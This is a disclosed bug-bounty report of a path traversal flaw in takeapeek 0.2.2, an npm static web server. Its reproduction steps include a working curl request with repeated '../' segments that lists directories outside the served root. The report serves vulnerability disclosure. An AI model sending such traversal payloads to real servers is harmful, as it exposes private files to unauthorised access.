# [takeapeek] Path traversal allow to expose directory and files

## Report Details
- **Report ID**: 403736
- **URL**: https://hackerone.com/reports/403736
- **State**: Closed
- **Severity**: high
- **Submitted**: 2018-09-01T05:13:41.721Z
- **Disclosed**: 2018-11-02T10:37:18.721Z

## Reporter
- **Username**: abdilahrf_
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report Path Travelsal in takeapeek
It allows attacker to list directory and files.

# Module

**module name:** takeapeek
**version:** 0.2.2
**npm page:** `https://www.npmjs.com/package/takeapeek`

## Module Description

A simple static webserver with only one command. Heavily inspired by glance, this is really more of a learning experience then anything.

## Module Stats

~100 downloads per month 

# Vulnerability

## Vulnerability Description

Attacker was able to exploit path traversal and view sensitive directory and files.

## Steps To Reproduce:

- `npm i takeapeek`
- `node node_modules/takeapeek/dist/bin.js`
- `curl --path-as-is http://localhost:3141/../../../../../../`

F340897


## Supporting Material/References:

- OS: Windows 10
- NODE: v10.8.0
- NPM : 6.2.0

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

It allows attacker to list directory and files.

## Attachments
- takeapeek-pathtraversal.PNG
